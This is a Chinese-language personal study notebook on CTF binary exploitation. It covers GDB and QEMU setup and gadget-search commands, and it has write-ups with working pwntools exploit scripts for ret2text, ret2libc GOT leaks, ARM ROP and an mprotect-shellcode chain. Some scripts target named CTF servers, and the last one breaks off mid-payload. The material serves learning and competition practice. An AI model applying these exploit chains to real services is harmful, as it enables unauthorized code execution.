



# GDB调试

## 查看got表

在run之后输入got查看got表

## 查看寄存器

使用tel xxxx查看地址的内容；

或者使用tel $rip查看寄存器中的数据；

# IOT

## 资料网站

https://www.cnblogs.com/H4lo/articles/11721932.html

## arm环境配置

gdb-arm:

```python
apt-get install qemu-user
apt-get install gdb-multiarch
apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu
交叉编译⼯具
apt install gcc-arm-linux-gnueabi
apt install libc6-arm64-cross
```

https://www.qemu.org/

https://blog.csdn.net/leumber/article/details/81078171

https://blog.csdn.net/tianyexing2008/article/details/111009427

运行方法：

```python
qume-arm -L /usr/arm-linux-gnueabi ./pwn #运⾏程序
--------------------------------------------------------------------
qume-arm -L /usr/arm-linux-gnueabi -g 8888 ./pwn #以888端⼝运⾏程序
--------------------------------------------------------------------
#链上端⼝来调试
gdb-multiarch
file ./pwn
target remote localhost:8888
---------------------------------------------------------------------
#设断点到调试地址，之后就可以正常调试
---------------------------------------------------------------------
#如果程序去除符号表，则要加载程序位置
ps -a #查看qemu端⼝
cat /proc/端⼝/maps #找到程序地址
---------------------------------------------------------------------
#在调试窗⼝ 但我⽬前并没有成功过qwq
add-symbol-file ./pwn 地址
b *地址
```

## arm汇编基础

https://www.anquanke.com/post/id/86383

## arm汇编常用指令

⼩⼯具： https://www.jb51.net/softs/10029.html#downintro2 arm常⽤寄存器： https://zhuanlan.zhihu.com/p/634696567

## 例题

ret2text_arm：

![image-20231103010758782](C:\Users\22522\AppData\Roaming\Typora\typora-user-images\image-20231103010758782.png)

exp：

```python
from pwn import *
context(log_level='debug',arch='arm')
pwn='./ret2text_arm'
p=process(["qemu-arm","-L","/usr/arm-linux-gnueabi",pwn])
backdoor=0x0001045C
payload=b'a'*0xc+p32(backdoor)
p.sendlineafter("input:\n",payload)
p.interactive()
```

2022安洵杯babyarm

![image-20231103010918161](C:\Users\22522\AppData\Roaming\Typora\typora-user-images\image-20231103010918161.png)

⾸先⽤ida分析⼀下，需要先绕过⼀个base64的判断，然后到溢出点，溢出量是0x2c.

![image-20231103010939032](C:\Users\22522\AppData\Roaming\Typora\typora-user-images\image-20231103010939032.png)

查看⼀下可⽤的gadget，再到ida⾥看

![image-20231103010959340](C:\Users\22522\AppData\Roaming\Typora\typora-user-images\image-20231103010959340.png)

这⾥是我们可以利⽤的gadget，⼈⻤师傅说反复利⽤csu，但是我实现不了，求教

exp:

```python
from pwn import *
p = process(["qemu-arm","-g", "4444","-L", "/usr/arm-linux-gnueabi/", "./c
hall"])
context.log_level='debug'
context.arch='arm'
elf = ELF('./chall')
libc = ELF('libc-2.27.so')
s = lambda data :p.send(str(data))
sa = lambda delim,data :p.sendafter(str(delim), str(data))
sl = lambda data :p.sendline(str(data))
sla = lambda delim,data :p.sendlineafter(str(delim), str(data)
)
r = lambda num :p.recv(num)
ru = lambda delims, drop=True :p.recvuntil(delims, drop)
itr = lambda :p.interactive()
uu32 = lambda data :u32(data.ljust(4,b'\x00'))
uu64 = lambda data :u64(data.ljust(8,b'\x00'))
leak = lambda name,addr :log.success('{} = {:#x}'.format(name,
addr))
sla('msg> ','s1mpl3Dec0d4r')
movcall = 0x00010ca0
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload = b'a'*0x2c+p32(r4)+p32(0)+p32(0)+p32(0)
payload +=p32(puts_got)+p32(0)+p32(0)+p32(0)
payload +=+p32(r3)+p32(puts_plt)+p32(movcall)+p32(0)+p32(0)+p32(0)+p32(0)+
p32(0)+p32(0)+p32(0)+p32(0x0010B60)
p.sendlineafter('comment> ',payload)
libcbase = uu64(r(4)) - libc.sym['puts']
system = libcbase + libc.sym['system']
binsh = libcbase + 0x00137db0 #0x00131bec
leak('libcbase',libcbase)
sla('msg> ','s1mpl3Dec0d4r')
payload = b'a'*0x2c+p32(r4)+p32(0)+p32(0)+p32(0)
payload +=+p32(binsh)+p32(0)+p32(0)+p32(0)+p32(r3)+p32(system)+p32(movcall
)
p.sendlineafter('comment> ',payload)
p.interactive()
```



# 小命令

```python
ROPgadget --binary xxx --string '/bin/sh'#查找字符串
ROPgadget --binary xxx --only 'pop|ret' | grep 'rdi'#查找控制寄存器的指令
```

## 找POP指令

```python
 ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret' | grep pop
```



## 寻找ret指令

```python
ROPgadget --binary xxx  --only 'ret'
```

## 找binsh字符串的地址

```python
binsh_addr = next(elf.search(b"/bin/sh"))
```

## 查看题目链接的libc版本

```python
ldd -v xxxx
```

## 确定patch什么库

```python
strings libc.xxxxx |grep Ubuntu
```

## 正式patch

```python
patchelf --set-interpreter /home/tangjunyi/桌面/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/ld-linux-x86-64.so.2 ./xxxx
```

```python
patchelf --add-needed /home/tangjunyi/桌面/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6 ./silent
```

## tmux分屏命令

```python
tmux new -s test#创建一个新会话
tmux kill-session -t test#删除一个会话
ctrl+p/n #切换会话
tmux set mouse on#设置鼠标支持，可以在窗口进行滚动
```

# 函数与寄存器

```python
write(1,buf,8)#分别为标准输出，输出的地址，输出的长度（字节）--------rdi rsi rdx
```

```python
int mprotect(const void *start, size_t len, int prot);#第一个参数填的是一个地址，是指需要进行操作的地址。

　　#第二个参数是地址往后多大的长度。

　　#第三个参数的是要赋予的权限。

　　#mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
```

prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：

　　1）PROT_READ：表示内存段内的内容可写；

　　2）PROT_WRITE：表示内存段内的内容可读；

　　3）PROT_EXEC：表示内存段中的内容可执行；

　　4）PROT_NONE：表示内存段中的内容根本没法访问。

***prot=7 是可读可写可执行**  **#这个是个知识点。。。我是没找到出处，我唯一能想到的就是师傅在调试的过程发现第三个参数等于7是赋给的内存地址权限是可读可写可执行叭。***

需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。

# 汇编基础

## 基本指令

```python
.text:000000000000120E                               ; __unwind {
.text:000000000000120E F3 0F 1E FA                   endbr64
.text:0000000000001212 55                            push    rbp
.text:0000000000001213 48 89 E5                      mov     rbp, rsp
.text:0000000000001216 48 83 EC 10                   sub     rsp, 10h
.text:000000000000121A C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0
.text:0000000000001221 83 7D FC 01                   cmp     [rbp+var_4], 1#不为零则跳转（即不相同就跳转）
.text:0000000000001225 75 11                         jnz     short loc_1238#如果上一次比较不相等就跳转
.text:0000000000001225
.text:0000000000001227 48 8D 3D DA 0D 00 00          lea     rdi, command                    ; "/bin/sh"
.text:000000000000122E B8 00 00 00 00                mov     eax, 0
.text:0000000000001233 E8 58 FE FF FF                call    _system
.text:0000000000001233
```

==mov eax,1【eax为目的操作数，1为源操作数】---目的操作数的内容会发生改变，而源操作数不会改变==

==cmp指令：通过让目的操作数减去源操作数来判断他俩是否相等，结果为0则不跳转继续执行下一个指令；如果结果不为0，就说明他俩不相等，此时在jnz进行跳转==

==jnz指令：如果上一次比较不相等就发生跳转==

# 极客大挑战2023--PWN

## ret2text

```python
from pwn import *
#p = process('./ret2text')
p = remote('pwn.node.game.sycsec.com',30867)
#gdb.attach(p)
elf = ELF('./ret2text')
context(os="linux",arch="amd64",log_level='debug')
p.recv()
payload =  b'a'*88 + b'\x27'#因为返回地址和backdoor的高两位相同，所以只用覆盖掉低两位就可以返回到backdoor
p.send(payload)
p.interactive()
```

```python
下面为ida中vuln函数汇编
text:000000000000123B                               ; __unwind {
.text:000000000000123B F3 0F 1E FA                   endbr64
.text:000000000000123F 55                            push    rbp
.text:0000000000001240 48 89 E5                      mov     rbp, rsp
.text:0000000000001243 48 83 EC 50                   sub     rsp, 50h
.text:0000000000001247 48 8D 3D C2 0D 00 00          lea     rdi, s                          ; "The simplest but not too simple pwn"
.text:000000000000124E E8 2D FE FF FF                call    _puts
.text:000000000000124E
.text:0000000000001253 48 8D 45 B0                   lea     rax, [rbp+buf]
.text:0000000000001257 BA 60 00 00 00                mov     edx, 60h ; '`'                  ; nbytes
.text:000000000000125C 48 89 C6                      mov     rsi, rax                        ; buf
.text:000000000000125F BF 00 00 00 00                mov     edi, 0                          ; fd
.text:0000000000001264 B8 00 00 00 00                mov     eax, 0
.text:0000000000001269 E8 32 FE FF FF                call    _read
.text:0000000000001269
.text:000000000000126E 90                            nop
.text:000000000000126F C9                            leave
.text:0000000000001270 C3                            retn
.text:0000000000001270                               ; } // starts at 123B
.text:0000000000001270
.text:0000000000001270                               vuln endp
```

下面为main函数汇编

```python
text:0000000000001271 F3 0F 1E FA                   endbr64
.text:0000000000001275 55                            push    rbp
.text:0000000000001276 48 89 E5                      mov     rbp, rsp
.text:0000000000001279 B8 00 00 00 00                mov     eax, 0
.text:000000000000127E E8 26 FF FF FF                call    init
.text:000000000000127E
.text:0000000000001283 B8 00 00 00 00                mov     eax, 0
.text:0000000000001288 E8 AE FF FF FF                call    vuln
.text:0000000000001288
.text:000000000000128D B8 00 00 00 00                mov     eax, 0#通过vuln的retn，我们会返回到这里
.text:0000000000001292 5D                            pop     rbp
.text:0000000000001293 C3                            retn
.text:0000000000001293                               ; } // starts at 1271
.text:0000000000001293
.text:0000000000001293                               main endp
.text:0000000000001293
.text:0000000000001293                               ; ---------------------
```

```python
backdoor函数的汇编
.text:000000000000120E F3 0F 1E FA                   endbr64
.text:0000000000001212 55                            push    rbp
.text:0000000000001213 48 89 E5                      mov     rbp, rsp
.text:0000000000001216 48 83 EC 10                   sub     rsp, 10h
.text:000000000000121A C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0
.text:0000000000001221 83 7D FC 01                   cmp     [rbp+var_4], 1
.text:0000000000001225 75 11                         jnz     short loc_1238
.text:0000000000001225
.text:0000000000001227 48 8D 3D DA 0D 00 00          lea     rdi, command                    ; "/bin/sh"#我们需要跳转到这里
.text:000000000000122E B8 00 00 00 00                mov     eax, 0
.text:0000000000001233 E8 58 FE FF FF                call    _system
.text:0000000000001233
```

```python
.text:0000000000001227 48 8D 3D DA 0D 00 00          lea     rdi, command                    ; "/bin/sh"
.text:000000000000128D B8 00 00 00 00                mov     eax, 0
```

对比上面两行代码，可以发现call的下一条指令和backdoor只有最后两位不同(27,8D)，所以我们在溢出之后将返回地址最后两位覆盖为\x27就可以返回到backdoor（注：返回地址是从低字节开始覆盖），因为高两位地址都是相同的，为12。故只用更改低两位，使其与backdoor相同。

## ret2libc

题目源码如下：

```python
main函数：
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  write(1, "try this\n", 9uLL);
  vuln();
  write(1, "bye ~", 5uLL);
  return 0;
}
```

```python
vuln函数：
size_t vuln()
{
  size_t result; // rax
  char s[16]; // [rsp+0h] [rbp-10h] BYREF

  write(1, "This challenge no backdoor!", 0x1BuLL);
  gets(s);
  result = strlen(s);
  if ( result > 0x10 )
  {
    write(1, "may you can pass it right?", 0x1AuLL);
    exit(1);
  }
  return result;
}
```


```python
GDB调试：
RAX  0xb
 RBX  0x7fffffffe028 —▸ 0x7fffffffe378 ◂— '/home/tangjunyi/pwn/chal'
 RCX  0x7ffff7fa0a80 (_IO_2_1_stdin_) ◂— 0xfbad208b
*RDX  0x5
 RDI  0x7fffffffdef0 ◂— 'sssssssssss'
 RSI  0x1
 R8   0x0
 R9   0x0
 R10  0x7ffff7ddd360 ◂— 0x10001a000070bc
 R11  0x7ffff7f23dc0 (__strlen_avx2) ◂— mov eax, edi
 R12  0x0
 R13  0x7fffffffe038 —▸ 0x7fffffffe391 ◂— 'COLORFGBG=15;0'
 R14  0x0
 R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
 RBP  0x7fffffffdf10 ◂— 0x1
 RSP  0x7fffffffdf10 ◂— 0x1
*RIP  0x4012ab (main+60) ◂— lea rsi, [rip + 0xd93]
──────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────
   0x401245 <vuln+72>     jbe    vuln+111                      <vuln+111>
    ↓
   0x40126c <vuln+111>    nop    
   0x40126d <vuln+112>    leave  
   0x40126e <vuln+113>    ret    
    ↓
   0x4012a6 <main+55>     mov    edx, 5
 ► 0x4012ab <main+60>     lea    rsi, [rip + 0xd93]
   0x4012b2 <main+67>     mov    edi, 1
   0x4012b7 <main+72>     mov    eax, 0
   0x4012bc <main+77>     call   write@plt                      <write@plt>
 
   0x4012c1 <main+82>     mov    eax, 0
   0x4012c6 <main+87>     pop    rbp
────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffdf10 ◂— 0x1
01:0008│         0x7fffffffdf18 —▸ 0x7ffff7df518a (__libc_start_call_main+122) ◂— mov edi, eax
02:0010│         0x7fffffffdf20 —▸ 0x7fffffffe010 —▸ 0x7fffffffe018 ◂— 0x38 /* '8' */
03:0018│         0x7fffffffdf28 —▸ 0x40126f (main) ◂— endbr64 
04:0020│         0x7fffffffdf30 ◂— 0x100400040 /* '@' */
05:0028│         0x7fffffffdf38 —▸ 0x7fffffffe028 —▸ 0x7fffffffe378 ◂— '/home/tangjunyi/pwn/chal'
06:0030│         0x7fffffffdf40 —▸ 0x7fffffffe028 —▸ 0x7fffffffe378 ◂— '/home/tangjunyi/pwn/chal'
07:0038│         0x7fffffffdf48 ◂— 0x1f77af0f3773e0d9
──────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────
 ► f 0         0x4012ab main+60
   f 1   0x7ffff7df518a __libc_start_call_main+122
   f 2   0x7ffff7df5245 __libc_start_main+133
   f 3         0x4010fe _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 

```

题目思路就是绕过strlen检测，溢出s。泄露write函数的真实地址

溢出了gets之后，查看栈。如果rdx小于8就不能使用csu，上图中rdx的值为0x5，也就是说只能输出五个数字，即并不能输出完整的地址。csu就可以pass掉了。

但是我们在main函数中的write汇编中可以找到这样的代码：

```python
.text:000000000040127C
.text:0000000000401281 48 8D 35 B3 0D 00 00          lea     rsi, aTryThis                   ; "try this\n"
.text:0000000000401288 BA 09 00 00 00                mov     edx, 9                          ; n
.text:000000000040128D BF 01 00 00 00                mov     edi, 1                          ; fd
.text:0000000000401292 B8 00 00 00 00                mov     eax, 0
.text:0000000000401297 E8 E4 FD FF FF                call    _write
.text:0000000000401297
.text:000000000040129C B8 00 00 00 00                mov     eax, 0
.text:00000000004012A1 E8 57 FF FF FF                call    vuln
.text:00000000004012A1
```

可以看出图中的rdx和rdi已经布置好了，即write的第一个和第三个参数不用我们再手动布置了。所以只要布置上方的rsi的地址就可以了，我们需要将write的got表地址传给rsi就可以了。

这时开始寻找gadget：

```python
┌──(root㉿tangjunyi)-[/home/tangjunyi/pwn]
└─# ROPgadget --binary chal  --only 'pop|ret' | grep 'rsi'
0x0000000000401331 : pop rsi ; pop r15 ; ret
```

==可以找到pop rsi的指令，但由于他附带了一个pop r15，这是我们不需要的，所以要将他跳过（把0填入r15进行占位）如下：==

可以构造第一段payload：

```python
payload = b'1\0' + b'a'*22 + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(0x401288)
```

解释一下这段payload，由于strlen会检测s的长度，所以要先进行绕过，\0可以让strlen函数停止检测（1\0占两个字节）。依次把write_got弹出到rsi，把0弹出到r15中占位，将返回地址覆盖为write函数进行输出。至于这里为什么不用lea的0x401281作为返回地址，因为我们在payload中已经将rsi寄存器的值布置好了，==如果跳转到lea，那么刚布置好的数值就会被右边的“try this\n”给覆盖，所以要跳过它，返回到0x401288==

成功输出了write的真实地址后进行接收：

```python
write_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
```

然后算出system和binsh的偏移即可

进行第二次溢出：

```python
payload = b'1\0' + b'a'*22 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system)
```

成功获取flag

完整exp：

```python
from pwn import *
#p = process('./chal')
p= remote('pwn.node.game.sycsec.com',30345)
#gdb.attach(p)
elf = ELF('./chal')
context(os="linux",arch="amd64",log_level='debug')

pop_rdi_ret = 0x401333
pop_rsi_r15_ret = 0x401331
write_got = elf.got['write']

payload = b'1\0' + b'a'*22 + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(0x401288)
p.sendline(payload)
write_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("write_addr = "+hex(write_addr))

libc = ELF('libc.so.6')#这里是打远程使用服务器的libc版本，如果是本地打还需要patch，非常麻烦。所以直接打远程就可以
write_of = libc.symbols['write']
binsh = next(libc.search(b'/bin/sh'))
system_of = libc.symbols['system']
libc_base = write_addr - write_of
system = libc_base + system_of
binsh_addr = binsh + libc_base
print("system"+hex(system))



payload = b'1\0' + b'a'*22 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system)
p.recv()
p.sendline(payload)
p.interactive()

```

# Tron-CTF-PWN

## pwn_01

main函数：

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  dofunc();
  return 0;
}
```

dofunc函数：

```python
int dofunc()
{
  int buf[5]; // [esp+8h] [ebp-14h] BYREF

  buf[0] = 0;
  buf[1] = 0;
  puts("input:");
  read(0, buf, 0x1Cu);
  printf((const char *)buf);
  return 0;
}

```

可以看出是一道栈溢出题，read可以向buf读入0x1c也就是28个字节，而buf的栈空间只有0x14也就是20个字节，看样子似乎是溢出24字节到返回地址，然后覆盖返回地址为backdoor。事实并不是如此，buf的栈空间到底有多大？？？打开我们的gdb，并进入dofunc函数：

```python
  0x804852a <dofunc+72>    lea    eax, [esp + 0x14]
   0x804852e <dofunc+76>    push   eax
   0x804852f <dofunc+77>    call   printf@plt                     <printf@plt>
 
   0x8048534 <dofunc+82>    add    esp, 0x10
   0x8048537 <dofunc+85>    mov    eax, 0
 ► 0x804853c <dofunc+90>    add    esp, 0x18#当gdb运行到这里，即esp+0x18的位置，查看栈空间
   0x804853f <dofunc+93>    pop    ebx
   0x8048540 <dofunc+94>    ret    
    ↓
   0x8048561 <main+32>      mov    eax, 0
   0x8048566 <main+37>      add    esp, 4
   0x8048569 <main+40>      pop    ecx
────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd0c0 —▸ 0xf7fc14a0 —▸ 0xf7d85000 ◂— 0x464c457f
01:0004│     0xffffd0c4 —▸ 0xf7fd98cb (_dl_fixup+235) ◂— mov edi, eax
02:0008│     0xffffd0c8 ◂— 'aaaaaa\n'
03:000c│     0xffffd0cc ◂— 0xa6161 /* 'aa\n' */
04:0010│     0xffffd0d0 —▸ 0xffffd110 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
05:0014│     0xffffd0d4 —▸ 0xf7fc1678 —▸ 0xf7ffdbac —▸ 0xf7fc1790 —▸ 0xf7ffda40 ◂— ...
06:0018│     0xffffd0d8 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
07:001c│     0xffffd0dc —▸ 0x8048561 (main+32) ◂— mov eax, 0
──────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────
 ► f 0 0x804853c dofunc+90
   f 1 0x8048561 main+32
   f 2 0xf7da8295 __libc_start_call_main+117
   f 3 0xf7da8358 __libc_start_main+136
   f 4 0x80483d2 _start+50
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

输入stack 30查看栈空间(如下图)：

```python
pwndbg> stack 30
00:0000│ esp 0xffffd0c0 —▸ 0xf7fc14a0 —▸ 0xf7d85000 ◂— 0x464c457f#1.这里开始给esp+0x18
01:0004│     0xffffd0c4 —▸ 0xf7fd98cb (_dl_fixup+235) ◂— mov edi, eax
02:0008│     0xffffd0c8 ◂— 'aaaaaa\n'#2.我们刚刚输入的aaaa储存在这里
03:000c│     0xffffd0cc ◂— 0xa6161 /* 'aa\n' */
04:0010│     0xffffd0d0 —▸ 0xffffd110 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
05:0014│     0xffffd0d4 —▸ 0xf7fc1678 —▸ 0xf7ffdbac —▸ 0xf7fc1790 —▸ 0xf7ffda40 ◂— ...
06:0018│     0xffffd0d8 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c#4.esp+0x18到达这里，所以这里才是ebp
07:001c│     0xffffd0dc —▸ 0x8048561 (main+32) ◂— mov eax, 0#5.那么这里就是真正的返回地址
08:0020│     0xffffd0e0 ◂— 0x1
09:0024│     0xffffd0e4 —▸ 0xffffd100 ◂— 0x1
0a:0028│ ebp 0xffffd0e8 ◂— 0x0
0b:002c│     0xffffd0ec —▸ 0xf7da8295 (__libc_start_call_main+117) ◂— add esp, 0x10#3.通常来说返回地址在这里，即ebp高一位的地方，但是这道题很特殊，他的返回地址并不在这。
0c:0030│     0xffffd0f0 ◂— 0x0
0d:0034│     0xffffd0f4 ◂— 0x70 /* 'p' */
0e:0038│     0xffffd0f8 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x33f14
0f:003c│     0xffffd0fc —▸ 0xf7da8295 (__libc_start_call_main+117) ◂— add esp, 0x10
10:0040│     0xffffd100 ◂— 0x1
11:0044│     0xffffd104 —▸ 0xffffd1b4 —▸ 0xffffd372 ◂— '/home/tangjunyi/pwn/pwn_01'
12:0048│     0xffffd108 —▸ 0xffffd1bc —▸ 0xffffd38d ◂— 'COLORFGBG=15;0'
13:004c│     0xffffd10c —▸ 0xffffd120 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
14:0050│     0xffffd110 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
15:0054│     0xffffd114 —▸ 0x8048541 (main) ◂— lea ecx, [esp + 4]
16:0058│     0xffffd118 ◂— 0x1
17:005c│     0xffffd11c —▸ 0xffffd1b4 —▸ 0xffffd372 ◂— '/home/tangjunyi/pwn/pwn_01'
18:0060│     0xffffd120 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
19:0064│     0xffffd124 —▸ 0x8048580 (__libc_csu_init) ◂— push ebp
1a:0068│     0xffffd128 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
1b:006c│     0xffffd12c ◂— 0x0
1c:0070│     0xffffd130 ◂— 0xefbf1ca9
1d:0074│     0xffffd134 ◂— 0xa519b6b9
pwndbg> 

```

我们再分析一遍dofunc函数的汇编：

```python
text:080484E2 53                            push    ebx
.text:080484E3 83 EC 18                      sub     esp, 18h
.text:080484E6 E8 05 FF FF FF                call    __x86_get_pc_thunk_bx
.text:080484E6
.text:080484EB 81 C3 15 1B 00 00             add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
.text:080484F1 C7 44 24 08 00 00 00 00       mov     [esp+1Ch+buf], 0
.text:080484F9 C7 44 24 0C 00 00 00 00       mov     [esp+1Ch+var_10], 0
.text:08048501 83 EC 0C                      sub     esp, 0Ch
.text:08048504 8D 83 00 E6 FF FF             lea     eax, (aInput - 804A000h)[ebx]   ; "input:"
.text:0804850A 50                            push    eax                             ; s
.text:0804850B E8 50 FE FF FF                call    _puts
.text:0804850B
.text:08048510 83 C4 10                      add     esp, 10h
.text:08048513 83 EC 04                      sub     esp, 4
.text:08048516 6A 1C                         push    1Ch                             ; nbytes
.text:08048518 8D 44 24 10                   lea     eax, [esp+24h+buf]
.text:0804851C 50                            push    eax                             ; buf
.text:0804851D 6A 00                         push    0                               ; fd
.text:0804851F E8 1C FE FF FF                call    _read
.text:0804851F
.text:08048524 83 C4 10                      add     esp, 10h
.text:08048527 83 EC 0C                      sub     esp, 0Ch
.text:0804852A 8D 44 24 14                   lea     eax, [esp+28h+buf]
.text:0804852E 50                            push    eax                             ; format
.text:0804852F E8 1C FE FF FF                call    _printf
.text:0804852F
.text:08048534 83 C4 10                      add     esp, 10h
.text:08048537 B8 00 00 00 00                mov     eax, 0
.text:0804853C 83 C4 18                      add     esp, 18h#在程序准备返回到的时候，他没有将ebp的值赋给esp，即他没有进行leave指令(清空栈帧，使ebp和esp相同)，而是直接将esp加了0x18便开始返回了，也就是他没有用ebp高一位的返回地址，而是提前返回了。而这个提前返回的地址可以通过GDB看出来（计算方法就是将当前esp的地址+0x18，正如这段汇编所描述的过程）
.text:0804853F 5B                            pop     ebx
.text:08048540 C3                            retn
```

将上方esp的地址+0x18得：0xd0c0 + 0x18 = 0xd0d8，这样我们就找到了dofunc真正的ebp，继而就能找到他真正的返回地址：

```python
06:0018│     0xffffd0d8 —▸ 0xf7fa1ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c#4.esp+0x18到达这里，所以这里才是ebp
07:001c│     0xffffd0dc —▸ 0x8048561 (main+32) ◂— mov eax, 0#5.那么这里就是真正的返回地址
```

然后我们再算buf的栈空间大小：

```python
02:0008│     0xffffd0c8 ◂— 'aaaaaa\n'#2.我们刚刚输入的aaaa储存在这里
```

即：0xd0d8 - 0xd0c8 = 16

也就是说buf的真实大小为16个字节，那么溢出到返回地址需要16+4=20个字节垃圾数据，可以构造payload：

```python
from pwn import *
p = process('./pwn_01')
#p= remote('pwn.node.game.sycsec.com',30345)
#gdb.attach(p)
elf = ELF('./pwn_01')
context(os="linux",arch="amd64",log_level='debug')
backdoor = 0x80484b6

payload = b'a'*20 + p32(backdoor)
p.recv()
p.sendline(payload)
p.interactive()
```

总结一下这道题，有时候函数并不是一定到了ebp才开始返回，要观察esp的变化，根据esp的加减情况，得出函数何时开始返回（==有时候还未到达ebp时函数便在中途返回==），==所以我们需要重新计算写入数据的地址到真正返回地址的距离，进而得出要溢出的长度。==

backdoor:

```python
int func()
{
  system(sh);
  return 0;
}
对应汇编：
.text:080484B6                               func proc near
.text:080484B6                               ; __unwind {
.text:080484B6 53                            push    ebx
.text:080484B7 83 EC 08                      sub     esp, 8
.text:080484BA E8 B0 00 00 00                call    __x86_get_pc_thunk_ax
.text:080484BA
.text:080484BF 05 41 1B 00 00                add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)
.text:080484C4 83 EC 0C                      sub     esp, 0Ch
.text:080484C7 8D 90 28 00 00 00             lea     edx, (sh - 804A000h)[eax]       ; "/bin/sh"
```



# BUUPWN刷题

## 向指定内存赋可执行权限

### get_started_3dsctf_2016

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [esp+4h] [ebp-38h] BYREF

  printf("Qual a palavrinha magica? ", v4[0]);
  gets(v4);
  return 0;
}
```

```python
void __cdecl get_flag(int a1, int a2)
{
  int v2; // esi
  unsigned __int8 v3; // al
  int v4; // ecx
  unsigned __int8 v5; // al

  if ( a1 == 814536271 && a2 == 425138641 )
  {
    v2 = fopen("flag.txt", "rt");
    v3 = getc(v2);
    if ( v3 != 255 )
    {
      v4 = (char)v3;
      do
      {
        putchar(v4);
        v5 = getc(v2);
        v4 = (char)v5;
      }
      while ( v5 != 255 );
    }
    fclose(v2);
  }
}
```

如上图，能发现在main函数中溢出到任意地址

```python
unsigned int __cdecl mprotect(int a1, int a2, int a3)
{
  unsigned int result; // eax

  result = dl_sysinfo(a2, a3);
  if ( result >= 0xFFFFF001 )
    return _syscall_error();
  return result;
}
```

在0x0806ec80发现了一个mprotect函数，可以在上面的笔记查看他的作用，之后vmmap，查看内存权限：

```python
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     Start        End Perm     Size Offset File
 0x8048000  0x80ea000 r-xp    a2000      0 /home/tangjunyi/pwn/xie
 0x80ea000  0x80ec000 rw-p     2000  a1000 /home/tangjunyi/pwn/xie#从这里开始修改为可执行权限,然后在这里写shellcode
 0x80ec000  0x810f000 rw-p    23000      0 [heap]
0xf7ff8000 0xf7ffc000 r--p     4000      0 [vvar]
0xf7ffc000 0xf7ffe000 r-xp     2000      0 [vdso]
0xfffdd000 0xffffe000 rw-p    21000      0 [stack]
```

虽然这道题开启了栈不可执行，但我们可以修改栈上的权限为可执行。可以使用mprotect进行修改（mprotect函数作用看上面的笔记）

找到开始修改的地址，即上图中的0x80ea000作为开始修改的地址

==需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。==即不能是0x80ebf80

长度可以设置为0x1000，反正大一点也没有坏处

执行权限就设置为7，也就是最高权限可读写可执行

传参的话就用==0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret==这一串即可，不用纠结用啥寄存器，能pop三个就行

当我们修改完权限后，就可以在指定内存读入shellcode了

开始构造payload：

```python
from pwn import *
#p = process('./xie')
#gdb.attach(p) #open gdb
context(os="linux",arch="i386",log_level='debug')
elf = ELF('./xie')
p = remote('node4.buuoj.cn',28097)
pop_ebx_esi_ebp_ret = 0x0804f460 #往函数里弹参数

mp1 = 0x80ea000 #这里是我们刚刚找到准备修改权限的起始地址，同时作为mprotect的参数和read的参数
mp2 = 0x1000 #修改的长度为0x1000
mp3 = 0x7 #修改权限等级为7
mprotect_addr = elf.symbols['mprotect'] #找到mprotect函数的地址
read_addr = elf.symbols['read'] #找到read函数的地址

payload = b'a'*0x38 + p32(mprotect_addr) + p32(pop_ebx_esi_ebp_ret) + p32(mp1) + p32(mp2) + p32(mp3)
